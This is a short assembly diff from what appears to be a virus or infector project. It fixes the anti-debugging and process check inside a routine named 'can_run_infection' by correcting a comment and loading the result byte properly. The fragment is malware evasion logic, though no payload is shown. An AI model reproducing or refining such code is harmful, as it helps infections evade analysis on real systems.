@@ -105,7 +105,7 @@ can_run_infection:
 	jl .debugged					; 	goto .debugged;
 
 	call check_process				; _ret = check_process();
-	cmp rax, 1					; if (_ret == !)
+	cmp rax, 1					; if (_ret == 1)
 	je .process					; 	goto .process;
 .end_anti_debugging:
 
@@ -304,7 +304,8 @@ check_process:
 	syscall						; );
 
 .end:
-	mov rax, [result]				; return result;
+	xor rax, rax
+	mov al, [result]				; return result;
 	add rsp, %$localsize
 	pop rbp
 	%pop
